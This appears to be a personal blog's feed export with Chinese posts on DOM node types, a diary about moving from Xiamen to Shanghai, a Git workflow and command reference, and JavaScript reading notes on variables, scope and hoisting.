<h2 id="HTML-DOM的nodeType属性（节点类型）："><a href="#HTML-DOM的nodeType属性（节点类型）：" class="headerlink" title="HTML DOM的nodeType属性（节点类型）："></a>HTML DOM的nodeType属性（节点类型）：</h2><p>nodeType一共存在 12 种不同的节点类型；详细的可看<a href="http://www.w3school.com.cn/jsref/prop_node_nodetype.asp" target="_blank" rel="noopener">W3school的文档</a><br>这里直说常见的前3种：</p>
<ul>
<li>Element，元素节点，nodeType返回1；</li>
<li>Attr，属性节点，nodeType返回2；</li>
<li>Text，文本节点，nodeType返回3；</li>
</ul>
<p>当使用<code>element.firstChild</code>时，因为<code>&lt;p class=&#39;active&#39;&gt;first&lt;/p&gt;</code> 之前有换行，所以会返回3，即文本节点。</p>
<h3 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h3><ul>
<li>使用<code>firstElementChild</code>替代<code>firstChild</code>，顾名思义，即选取第一个元素节点；</li>
<li>使用<code>childNodes[1]</code>替代<code>firstChild</code>，即选取第二个子节点。</li>
</ul>
<h2 id="nodeName（节点名称）-amp-nodeValue（节点值）"><a href="#nodeName（节点名称）-amp-nodeValue（节点值）" class="headerlink" title="nodeName（节点名称）&amp;nodeValue（节点值）"></a>nodeName（节点名称）&amp;nodeValue（节点值）</h2><table>
<thead>
<tr>
<th>nodeType</th>
<th>nodeName</th>
<th>nodeValue</th>
</tr>
</thead>
<tbody>
<tr>
<td>Element</td>
<td>元素名（p/div/…）</td>
<td>null</td>
</tr>
<tr>
<td>Attr</td>
<td>属性名称（name/class/id/…）</td>
<td>属性值</td>
</tr>
<tr>
<td>Text</td>
<td>#text</td>
<td>text内容</td>
</tr>
</tbody>
</table>
<p>参考了<a href="http://www.cnblogs.com/dh616854836/archive/2011/08/14/2138038.html" target="_blank" rel="noopener">DOM中元素节点、属性节点、文本节点的理解</a>和<a href="http://www.w3school.com.cn/jsref/prop_node_nodetype.asp" target="_blank" rel="noopener">W3school</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>Q&amp;A</tag>
      </tags>
  </entry>
  <entry>
    <title>2019年7、8、9月</title>
    <url>/2019/09/2019%E5%B9%B47%E3%80%818%E3%80%819%E6%9C%88.html</url>
    <content><![CDATA[<p>告别了校招的第一份工作，7月在享受自由和日益积累的焦虑中快速度过了。</p>
<a id="more"></a>
<p>上半月在星巴克复习了大概一周多，下半月则是开始投一些小公司面试练练手，但我并不打算留下来。<br>在自我感觉准备的不错之后，7月底，我来了上海，开始投一些上海杭州的岗位。互联网一线城市的包容性和机会是远远大于厦门的，面试还算顺利，如愿拿到了一些offer。（有幸接到阿里的电话面试，但是被追根究底的大佬给问懵了😭😭😭</p>
<p>打破自己的舒适圈并不容易，对于毕业一年的前端，社招的难度还是挺大的，3年+经验成了很多大厂招聘的硬性条件，适合自己的HC并不多，要把握机会～ 面试的这段时间很累，裸辞的时间越久，焦虑也越多。中间甚至有一小段时间会失眠，晚上3点才能睡着。</p>
<p>当初奔着城市读了大学，现在离开它，也算是画上了句号。一个人过去，再一个人离开，什么也没带走。<br>相比厦门，上海大了太多。路上看到有便利店叫上海如海，嗯，不错的名字。<br>从一个城市到另一个城市，又是一个从零开始。那以后会去哪里。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=438456405&auto=1&height=66"></iframe>

<img src="https://static.simmzl.cn/blog/v2/imgs/201978901.JPG" class="has-title" width="400" title="Starbucks & FE">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978902.JPG" class="has-title" width="400" title="离开厦门">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978912.JPG" width="500">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978903.JPG" class="has-title" width="500" title="Shang Hai">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978904.JPG" class="simmzl">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978920.JPG" class="simmzl">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978906.JPG" width="400">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978907.JPG" width="400">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978908.jpeg" width="400">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978910.JPG" class="simmzl">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978905.JPG" class="simmzl">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978913.JPG" class="has-title" width="400" title="【IKEA】">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978919.JPG" width="400">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978914.JPG" width="500">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978915.JPG" class="simmzl">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978917.JPG" width="400">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978916.JPG" width="400">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978918.JPG" class="has-title" width="400" title="日出">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978909.JPG" class="simmzl">
<img src="https://static.simmzl.cn/blog/v2/imgs/201978921.JPG" class="simmzl">]]></content>
      <categories>
        <category>影像月历</category>
      </categories>
  </entry>
  <entry>
    <title>Git工作流及常见命令</title>
    <url>/2018/03/Git%E5%B7%A5%E4%BD%9C%E6%B5%81.html</url>
    <content><![CDATA[<p>多人协作Git操作必不可少，结合实际工作中遇到的需求和问题，总结下整个Git工作流以及常用到的Git命令。</p>
<a id="more"></a>
<h2 id="常用分支约定"><a href="#常用分支约定" class="headerlink" title="常用分支约定"></a>常用分支约定</h2><h3 id="主分支"><a href="#主分支" class="headerlink" title="主分支"></a>主分支</h3><p>用于正式上线发布；<code>master</code></p>
<h3 id="开发分支"><a href="#开发分支" class="headerlink" title="开发分支"></a>开发分支</h3><p>用于开发，融合功能分支；在开发分支的基础上可以新建很多具体功能分支、BUG分支；<code>dev</code></p>
<h3 id="测试分支"><a href="#测试分支" class="headerlink" title="测试分支"></a>测试分支</h3><p>用于测试部署；<code>test</code></p>
<h2 id="开发流程"><a href="#开发流程" class="headerlink" title="开发流程"></a>开发流程</h2><p>每个新功能的开发，都要先<code>git pull</code>更新开发分支<code>dev</code>，然后在其基础上新建自己的分支。开发完成后自测功能没有BUG，<code>git push</code>自己的分支和代码到远程仓库，之后在平台上发起<code>pull/merge request</code>申请把自己的分支融合到<code>dev</code>分支。<br>以某新功能开发为例：</p>
<ul>
<li><p><code>git init</code> 新建本地git仓库，就可以开始折腾了。</p>
</li>
<li><p><code>git clone</code>远程仓库到本地</p>
</li>
<li><code>git checkout dev</code>切换到本地分支</li>
<li><code>git pull</code>更新本地代码到最新</li>
<li><code>git checkout -b czl/0323/feature</code> 建立新功能的开发分支，分支命名格式要统一，可以是为<code>{名字首字母}/{日期}/{新功能名}</code></li>
<li><code>git push --set-upstream origin czl/0323/feature</code> 将新建的分支推送到远端仓库</li>
<li>开发自测没问题后，<code>git add .</code> <code>git commit -m &quot;&quot;</code> <code>git push</code>到远程分支</li>
<li>在平台上发起<code>merge request</code>，等待代码审核</li>
</ul>
<h2 id="常见Git命令"><a href="#常见Git命令" class="headerlink" title="常见Git命令"></a>常见Git命令</h2><h3 id="仓库关联-amp-branch"><a href="#仓库关联-amp-branch" class="headerlink" title="仓库关联 &amp; branch"></a>仓库关联 &amp; branch</h3><ul>
<li><code>git remote add origin git@github.com:git_username/repository_name.git</code> 本地目录下关联远程仓库</li>
<li><code>git remote remove origin</code> 取消本地目录下关联的远程仓库</li>
</ul>
<ul>
<li><code>git checkout &lt;branchname&gt;</code> 切换分支</li>
<li><code>git checkout -b &lt;local-branchname&gt;</code> 新建本地分支</li>
<li><code>git branch</code> 查看本地分支</li>
<li><code>git branch -r</code> 查看远程分支</li>
<li><code>git branch -a</code> 查看本地和远程所有分支</li>
<li><code>git branch -d &lt;local-branchname&gt;</code> 删除本地分支</li>
<li><code>git branch -D &lt;local-branchname&gt;</code> 强制删除本地未合并分支</li>
<li><code>git push origin --delete &lt;remote-branchname&gt;</code> 删除远程分支</li>
<li><code>git push origin &lt;local-branchname&gt;:&lt;remote-branchname&gt;</code> 将本地分支push到远程分支上，这个远程分支不存在，且会被命名为命令里指定的<code>&lt;remote-branchname&gt;</code></li>
<li><code>git push origin :&lt;remote-branchname&gt;</code> 将一个空分支push到远程分支上，即删除这个分支</li>
</ul>
<h3 id="merge-amp-diff"><a href="#merge-amp-diff" class="headerlink" title="merge &amp; diff"></a>merge &amp; diff</h3><ul>
<li><p><code>git merge --abort</code> 合并分支后未提交，可撤销merge</p>
</li>
<li><p><code>git cherry-pick -n &lt;commit-id&gt; &lt;commit-id&gt;</code> 分支仅合并另一个分支的某一个commit</p>
<blockquote>
<p>如A分支想合并B分支上具体某一个或多个commit，可在A分支上执行上述命令，字面意思 “拣选，摘樱桃”</p>
<p><code>-n</code> 的意思是合并过来后是已add暂存，未commit的状态。不加则直接自动完成commit</p>
</blockquote>
</li>
<li><p><code>git diff</code> 对比本地与暂存区的具体差异，如果使用了<code>git add</code>，是无法看到自己的更改差异的</p>
</li>
<li><code>git diff filePath</code> 对比指定文件的与暂存区的不同，这个<code>filePath</code>可以通过<code>git status</code>看得到</li>
<li><code>git diff --word-diff</code> 详细展示一行中的修改</li>
<li><code>git diff &lt;commit-id&gt; &lt;commit-id&gt;</code> 查看两个 commit 的不同</li>
<li><code>git diff branch1 branch2 --stat</code> 查看两个分支文件变动对比，类似于<code>git status</code>的效果，在本地执行master merge develop时很需求这个</li>
<li><code>git diff branch1 branch2</code> 查看两个分支具体差异，类似于<code>git diff</code></li>
</ul>
<ul>
<li><code>git status</code> 显示工作目录和暂存区的状态（相较于暂存区，工作区更改了哪些文件）</li>
<li><code>git log</code> 查看commit的历史；</li>
<li><code>git show [commitHashID]</code> 查看具体某个commit的提交详情；</li>
</ul>
<h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>有时候可能会遇到在无任何修改时，diff整个文件全部变动的情况，可能是文件权限变动的原因</p>
<ul>
<li><code>git config --add core.filemode false</code> 当文件权限被无意改动时，<code>git diff</code>会提示 <code>old mode 100755</code> <code>new mode 100644</code>诸如此类，无法使用<code>git checkout .</code>舍弃掉，可以通过该命令忽略 <strong>单个项目</strong> 文件权限</li>
<li><code>git config --global core.filemode false</code> 全局忽略文件权限</li>
</ul>
<h3 id="回滚-reset-amp-revert"><a href="#回滚-reset-amp-revert" class="headerlink" title="回滚 reset &amp; revert"></a>回滚 reset &amp; revert</h3><ul>
<li><code>git reset HEAD~n</code> 回退到前几个commit版本；<code>n=1</code>则为回退到最新的commit未<code>git add</code>时的状态，该commit的文件变动仍存在，使用<code>git checkout .</code>可清空。<code>HEAD</code>是当前分支引用的指针，<code>HEAD～1</code>则是上一次</li>
<li><code>git reset &lt;commitHashID&gt;</code> 回退到hash对应commit，若想回到<code>commit1</code>，这个<code>commitHashID</code>需为<code>commit1</code>上一个<code>commit</code>的<code>hash</code>,此时<code>commit1</code>的文件变动存在，为未<code>git add</code>的状态</li>
<li><code>git reset --hard &lt;commitHashID&gt;</code> 上一条为例，加<code>--hard</code>的不同是会把<code>commit1</code>的变动<strong>删除掉</strong></li>
<li><p><code>git reset --hard HEAD~n</code> 回到上个提交，舍弃本地未提交的内容。</p>
<blockquote>
<p>关于<code>reset &amp; revert</code> 的tips：</p>
<p>如果在本地去reset<strong>未push到远程</strong>的commit，不会有任何问题，reset掉的commit不会出现在<code>git log</code>里，是真正意义上的删除原先的commit。</p>
<p>但如果要在本地reset<strong>已push到远程</strong>的commit，在本地reset后push到远程，会提示<code>更新被拒绝，因为您当前分支的最新提交落后于其对应的远程分支。</code>，这是因为reset把原来的commit删除掉了，造成了落后。此时根据提示<code>git pull</code>，如果改动了统一文件同一地方，<strong>会报冲突</strong>，还需要解决冲突。如果合并一些老的分支时，可能删除的commit又被合回来了。</p>
<p>因此<code>reset</code>更适合<strong>回退本地commit</strong>使用，这时候可能需要<code>git revert</code>登场了。</p>
<p><code>revert</code>其实就是用一个新的commit来抵消要回滚的commit，<code>reset</code>则是删除要回滚的commit。<br><code>git revert</code>自动提交commit，直接<code>git push</code>即可提交</p>
</blockquote>
</li>
<li><p><code>git revert HEAD</code>创建一个新的commit回滚掉最新的一个commit</p>
</li>
<li><p><code>git revert commitId</code>回滚具体的commit</p>
</li>
<li><p><code>git checkout test.js</code> 舍弃某一文件的本地修改</p>
</li>
<li><code>git checkout .</code> 舍弃本地所有修改</li>
</ul>
<h3 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h3><ul>
<li><code>git stash</code> 将本地修改记录保存到堆栈中</li>
<li><p><code>git stash list</code> 查看堆栈中现有储藏</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span> git stash list</span><br><span class="line">stash@&#123;0&#125;: WIP on master: 049d078 added the index file</span><br><span class="line">stash@&#123;1&#125;: WIP on master: c264051 Revert "added file_size"</span><br><span class="line">stash@&#123;2&#125;: WIP on master: 21d80a5 added number to log</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>git stash apply</code> 将最新的储藏应用到本地</p>
</li>
<li><code>git stash apply stash@{2}</code> 应用指定储藏</li>
<li><code>git stash drop stash@{2}</code> <code>apply</code>应用储藏后不会删除，使用<code>drop</code>可删除指定储藏</li>
<li><code>git stash pop</code> 应用最想念储藏且从堆栈中删除储藏</li>
<li><code>git stash clear</code> 删除所有储藏</li>
<li><p><code>git stash show stash@{n}</code> 显示文件变动，不带<code>stash@{n}</code>默认显示储藏第一个</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">src/pages/a.vue   |  2 +-</span><br><span class="line">src/pages/ibndex.vue | 16 +++++++++++++---</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>git stash show -p stash@{n}</code> 显示文件具体diff，不带<code>stash@{n}</code>默认显示储藏第一个</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">- &lt;div&gt;&lt;/div&gt;</span><br><span class="line">+ &lt;div&gt;diff&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>git stash -p</code> stash<strong>部分文件</strong>，这是个交互式命令，会遍历询问每个文件内容是否储藏</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&gt;&gt; git stash -p</span><br><span class="line">&gt;&gt; &lt;diff&gt;</span><br><span class="line">&gt;&gt; Stash this hunk [y,n,q,a,d,e,?]?</span><br></pre></td></tr></table></figure>
<p>[y,n,q,a,d,e,?] 具体含义：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">y - stage this hunk</span><br><span class="line">n - <span class="keyword">do</span> not stage this hunk</span><br><span class="line">q - quit; <span class="keyword">do</span> not stage this hunk nor any of the remaining ones</span><br><span class="line">a - stage this hunk and all later hunks <span class="keyword">in</span> the file</span><br><span class="line">d - <span class="keyword">do</span> not stage this hunk nor any of the later hunks <span class="keyword">in</span> the file</span><br><span class="line">g - select a hunk to go to</span><br><span class="line">/ - search <span class="keyword">for</span> a hunk matching the given regex</span><br><span class="line">j - leave this hunk undecided, see next undecided hunk</span><br><span class="line">J - leave this hunk undecided, see next hunk</span><br><span class="line">k - leave this hunk undecided, see previous undecided hunk</span><br><span class="line">K - leave this hunk undecided, see previous hunk</span><br><span class="line">s - split the current hunk into smaller hunks</span><br><span class="line">e - manually edit the current hunk</span><br><span class="line">? - <span class="built_in">print</span> <span class="built_in">help</span></span><br></pre></td></tr></table></figure>
<p>正常情况下，需要stash就是y，不需要就是n，后面没有需要stash的文件就q。</p>
</li>
</ul>
<h3 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h3><p>不赘述了，常用的一个场景：从 <code>master</code> 分支拉出来的 <code>feature</code> 分支在每次开发前，执行 <code>git rebase master</code>，以保持 <code>feature</code> 和 <code>master</code> commit同步。避免使用 <code>git merge master</code> 造成没必要的 <code>commit记录</code> 污染。</p>
<p>执行 <code>git rebase master</code> 遇到冲突时，git 会停止 rebase 并会让你解决冲突。在解决完冲突后，用 <code>git add</code> 暂存，然后执行 <code>git rebase --continue</code> 继续rebase，注意无需commit⚠️</p>
<p>执行 <code>git rebase —abort</code> 终止rebase操作，分支会回到 rebase 开始前的状态。</p>
<p>原理：</p>
<ul>
<li>首先， git 会把 feature 分支的每个 commit 取消掉；</li>
<li>其次，把上面的操作临时保存成 patch 文件，存在 .git/rebase 目录下；</li>
<li>然后，把 feature 分支更新到最新的 master 分支；</li>
<li>最后，把上面保存的 patch 文件应用到 feature 分支上；</li>
</ul>
<h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><ul>
<li><code>git checkout file --our/theirs</code> 解决冲突(resolve conflict)，ours本地，theirs非本地</li>
<li><code>git checkout --our/theirs .</code> 解决冲突(resolve conflict)，ours本地，theirs非本地，应用全部文件</li>
</ul>
<h2 id="实际需求"><a href="#实际需求" class="headerlink" title="实际需求"></a>实际需求</h2><h3 id="在github上新建一个空仓库，来关联本地仓库，这是github的官方提示："><a href="#在github上新建一个空仓库，来关联本地仓库，这是github的官方提示：" class="headerlink" title="在github上新建一个空仓库，来关联本地仓库，这是github的官方提示："></a>在github上新建一个空仓库，来关联本地仓库，这是github的官方提示：</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git add README.md</span><br><span class="line">git commit -m <span class="string">"first commit"</span></span><br><span class="line">git remote add origin https://github.com/username/repositoryName.git 关联远程仓库</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>
<p>或者直接关联本地已有仓库</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git remote add origin https://github.com/username/repositoryName.git</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>
<h3 id="本地分支在开发中需要pull远程已经更新过的dev分支："><a href="#本地分支在开发中需要pull远程已经更新过的dev分支：" class="headerlink" title="本地分支在开发中需要pull远程已经更新过的dev分支："></a>本地分支在开发中需要pull远程已经更新过的dev分支：</h3><ul>
<li>从本地分支<code>local</code>切回<code>dev</code>分支：<code>git checkout dev</code>;</li>
<li>更新本地<code>dev</code>分支： <code>git pull</code>;</li>
<li>切回本地分支<code>local</code>：<code>git checkout local</code>;</li>
<li>将更新过后的本地<code>dev</code>分支<code>merge</code>到<code>local</code>分支: <code>git merge dev</code>.</li>
<li>done!</li>
</ul>
<h3 id="正在开发一半的代码，需要改一下上次commit的一个bug，但又不想提交正在开发的代码："><a href="#正在开发一半的代码，需要改一下上次commit的一个bug，但又不想提交正在开发的代码：" class="headerlink" title="正在开发一半的代码，需要改一下上次commit的一个bug，但又不想提交正在开发的代码："></a>正在开发一半的代码，需要改一下上次commit的一个bug，但又不想提交正在开发的代码：</h3><p>使用<code>git stash</code>暂存当前的工作，回退到某个版本执行一定操作后再取回暂存的代码：</p>
<ul>
<li><code>git stash</code> 暂存当前的工作；</li>
<li><code>git reset HEAD~n</code> n表示最近几次的提交，1则是最近一次的提交，回退到最近一次提交的版本。</li>
<li><code>git stash pop</code> 将暂存的代码取回。</li>
</ul>
<h3 id="分支命名错误，重新命名："><a href="#分支命名错误，重新命名：" class="headerlink" title="分支命名错误，重新命名："></a>分支命名错误，重新命名：</h3><ul>
<li><code>git branch -m old_loal_branch_name new_local_branch_name</code> 重命名本地分支</li>
<li><code>git push origin :old_local_branch_name</code> 删除远程分支</li>
<li><code>git push origin new_local_branch_name</code> 重新推送提交本地分支</li>
</ul>
<h3 id="回滚"><a href="#回滚" class="headerlink" title="回滚"></a>回滚</h3><h3 id="cherry-pick"><a href="#cherry-pick" class="headerlink" title="cherry-pick"></a>cherry-pick</h3><h4 id="场景："><a href="#场景：" class="headerlink" title="场景："></a>场景：</h4><ul>
<li>在A分支创建新分支A1</li>
<li>commit(commit-id: aaaaaaaa)后合入B分支</li>
<li>删除A1</li>
<li>此时在A分支若想合入<code>aaaaaaaa</code>的commit，执行<code>git cherry-pick -n aaaaaaaa</code>，会报错：<code>bad version aaaaaaaa</code>，因为该commit的原分支信息已丢失，无法合入</li>
</ul>
<h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><ul>
<li>拉去<code>aaaaaaaa</code>来创建一个新的分支：<code>git checkout -b &lt;new_branch_name&gt; aaaaaaaa</code></li>
<li>然后再执行<code>git cherry-pick -n aaaaaaaa</code></li>
</ul>
<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><h3 id="Git钩子"><a href="#Git钩子" class="headerlink" title="Git钩子"></a>Git钩子</h3><p>可以使用<code>husky</code>或其他插件在precommit或者prepush时执行脚本命令。<br>遇到个问题:<br>在commit之前，会自动执行<code>npm run -s precommit</code>, 然后根据<code>package.json &gt; scripts &gt; &quot;precommit&quot;: &quot;npm run lint&quot;</code> ，执行<code>npm run lint</code>进行代码校验。但是自动执行<code>npm run -s precommit</code>时会报“npm 不是内部或外部命令”，手动执行<code>npm run -s precommit</code>一切正常，且<code>node</code>、<code>npm</code>全局环境均已配好。目前还不知道原因所在，只能通过<code>git commit --no-verify</code>绕过验证.</p>
<h2 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h2><p><a href="https://git-scm.com/book/zh/v1/自定义-Git-Git挂钩" target="_blank" rel="noopener">Git挂钩</a></p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>JS权威指南(犀牛书)读书笔记</title>
    <url>/2017/09/JS%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97(%E7%8A%80%E7%89%9B%E4%B9%A6)%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h1 id="NoteOfRhinoBook"><a href="#NoteOfRhinoBook" class="headerlink" title="NoteOfRhinoBook"></a>NoteOfRhinoBook</h1><blockquote>
<p>JS权威指南(犀牛书)读书笔记</p>
<p>创建这个项目的原因：秋招中发现自己的基础还是相对薄弱，希望能够完善自己的js基础，多过几遍犀牛书。之所以放在Github上，就当作给自己一个督促吧，每天都要看，并且及时更新笔记。</p>
</blockquote>
<a id="more"></a>
<h2 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">    name:<span class="string">"Rhino"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>访问对象属性除了.还可以用[];</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">book.name == book[<span class="string">"name"</span>];</span><br></pre></td></tr></table></figure>
<p>数组和对象都可以包含另一个数组或者对象；</p>
<h2 id="第二章-第三章-词法结构和类型、值、变量"><a href="#第二章-第三章-词法结构和类型、值、变量" class="headerlink" title="第二章 第三章 词法结构和类型、值、变量"></a>第二章 第三章 词法结构和类型、值、变量</h2><ul>
<li>js<strong>区分大小写</strong>，html不区分；如js构造函数名首字母大写等;</li>
<li>js支持Unicode,变量要求<strong>以字母、$和_开头</strong>，所有很多颜文字是可以用的2333：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ಠ_ಠ;</span><br><span class="line"><span class="keyword">var</span> 눈_눈;</span><br><span class="line"><span class="keyword">var</span> อิ_อิ;</span><br></pre></td></tr></table></figure>
<ul>
<li>js数据类型包括原始类型和对象类型；js中除了<strong>数字、字符串、布尔、null、undefined外就是对象</strong>，特殊的对象有数组、函数；null和undefined是无法拥有方法的值；</li>
<li>js解释器拥有自己的<strong>内存管理机制，垃圾回收</strong>；</li>
<li>js是<strong>面向对象</strong>的编程语言；</li>
<li>求余运算符%；</li>
<li>ES标准是不支持8进制数的，js中用16进制</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">0xfff</span>;</span><br><span class="line"><span class="built_in">isNaN</span>(a); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>
<ul>
<li>0和-0只有在作为被除数时才不相同，1/0 === 1/-0 ;//正无穷大和负无穷大（很少用到）；</li>
<li>一个有趣的现象：任何使用二进制浮点数的编程语言在对十进制分数（0.1,0.01…）只能做到及其近似精确(有舍入误差)，amazing!</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">.3</span> - <span class="number">.2</span>;</span><br><span class="line"><span class="keyword">var</span> y = <span class="number">.2</span> - <span class="number">.1</span>;</span><br><span class="line">x == y; <span class="comment">//false;x = 0.09999999999999998 ,y = 0.1;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ES5中字符串当作<strong>只读数组</strong>，有<strong>length属性，可使用索引,</strong>调用方法返回的是个新字符串；</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"hello,world"</span>;</span><br><span class="line">str.charAt(index);<span class="comment">//取出第index的字符；</span></span><br><span class="line">str.substring(start,end);<span class="comment">//返回第start到end的字符,不包括end</span></span><br><span class="line">str.slice(start,end);<span class="comment">//同上</span></span><br><span class="line">str.slice(<span class="number">-3</span>);<span class="comment">//后三</span></span><br><span class="line">str.indexOf(<span class="string">"o"</span>);<span class="comment">//首次出现o的位置</span></span><br><span class="line">str.lastIndexOf(<span class="string">"o"</span>);<span class="comment">//最后出现o的位置</span></span><br><span class="line">str.indexOf(<span class="string">"o"</span>,<span class="number">3</span>);<span class="comment">//在位置3及之后首次出现“o”的位置</span></span><br><span class="line">str.split(<span class="string">","</span>);<span class="comment">//以,分割(数组是splice(),还有arr.slice())</span></span><br><span class="line">str.replace(<span class="string">"h"</span>,<span class="string">"H"</span>);<span class="comment">//替换</span></span><br><span class="line">str.toUpperCasr();<span class="comment">//大写</span></span><br><span class="line"><span class="comment">//还有一些正则表达式的方法等等</span></span><br></pre></td></tr></table></figure>
<p>其中str.split()和数组的splice()和slice()有点绕，所以特意写了一篇<a href="http://blog.csdn.net/sinat_38752382/article/details/77717965" target="_blank" rel="noopener">博客</a></p>
<h3 id="3-9-变量声明"><a href="#3-9-变量声明" class="headerlink" title="3.9 变量声明"></a>3.9 变量声明</h3><ul>
<li>js是动态语言（Python/Ruby），即不给任何变量指定数据类型，相对的，C/C++/C#/JAVA则是静态语言；</li>
<li>在严格模式下给一个未声明的变量赋值会报错，非严格则会提升为全局变量；</li>
<li>只声明不赋值变量数据类型为<strong>undefined</strong></li>
</ul>
<h3 id="3-10-变量作用域scope"><a href="#3-10-变量作用域scope" class="headerlink" title="3.10 变量作用域scope"></a>3.10 变量作用域scope</h3><ul>
<li>在函数体内，局量（局部变量）的优先级高于同名的全量。即若在函数内声明一个和全量重名的局量或者和全量重名的参数，则全量在函数体内会被其覆盖；</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//局部变量</span></span><br><span class="line"><span class="keyword">var</span> a =<span class="string">"global"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkScope</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="string">"local"</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(checkScope());<span class="comment">//local</span></span><br><span class="line"><span class="built_in">console</span>.log(a);<span class="comment">//global</span></span><br><span class="line"><span class="comment">//参数</span></span><br><span class="line"><span class="keyword">var</span> b =<span class="string">"global"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkScope</span>(<span class="params">b</span>)</span>&#123;</span><br><span class="line">    b=<span class="string">"local"</span>;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(checkScope());<span class="comment">//local</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>函数作用域和声明提前</strong><ul>
<li>在C语言中，每一个花括号内的代码都有各自的作用域，叫做块级作用域，而<strong>js是没有块级作用域的</strong>（block scope）;</li>
<li><strong>js使用的是函数作用域</strong>（function scope）：变量在声明他们的函数体以及这个函数嵌套的函数体内都是有定义的；</li>
<li><strong>声明提前</strong>：js函数里声明的所有变量（<strong>但不涉及赋值</strong>）都被<strong>提前到了函数体的顶部</strong>！</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> scope = <span class="string">"global"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(scope);<span class="comment">//undefined(不是global，也不是local)</span></span><br><span class="line">    <span class="keyword">var</span> scope = <span class="string">"local"</span>; <span class="comment">//该声明会提前到函数体顶但是没有把赋值提前，只有程序执行到该语句才会被赋值</span></span><br><span class="line">    <span class="built_in">console</span>.log(scope); <span class="comment">//此时局部变量scope才被赋值为local</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//所以可以将变量声明放在函数体顶部，然后用到时再赋值，这是个不错的编程习惯！</span></span><br></pre></td></tr></table></figure>
<ul>
<li>JS的全局变量相当于全局对象的属性。使用var 声明时无法删除（delete）;</li>
</ul>
